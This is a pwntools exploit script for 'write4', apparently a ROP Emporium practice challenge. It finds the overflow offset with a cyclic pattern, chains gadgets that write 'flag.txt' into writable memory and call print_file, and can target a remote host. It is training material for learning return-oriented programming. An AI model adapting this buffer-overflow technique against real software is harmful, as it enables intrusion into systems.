#!/usr/bin/env python3

from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def find_offset(payload):
    proc = start()
    proc.sendlineafter(b'>', payload)
    proc.wait()
    ip_offset = cyclic_find(proc.corefile.read(proc.corefile.sp, 4))
    return ip_offset

exe = './write4'
elf = context.binary = ELF(exe, checksec=False)
rop = ROP(elf)
context.log_level = 'error'

# crafting the payload
offset = find_offset(cyclic(100))
info(f"Offset: {offset:x}")

pop_data = rop.find_gadget(["pop r14", "pop r15", "ret"])[0]
info(f"Pop Data Gadget: {pop_data}")
#mov_data = rop.find_gadget(["mov    QWORD PTR [r14],r15", "ret", "nop"])[0]
#info(f"Move Data Gadget: {mov_data}")

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
info(f"Pop RDI: {pop_rdi}")

payload = flat({ offset: [
        pop_data,
        0x00601028,
        b"flag.txt",
        0x0000000000400628,
        pop_rdi,
        0x00601028,
        elf.symbols.print_file
    ] })
write('payload', payload)
info(f"Payload: {payload}")

#executing the exploit
io = start()
io.sendlineafter(b'>', payload)
io.interactive()

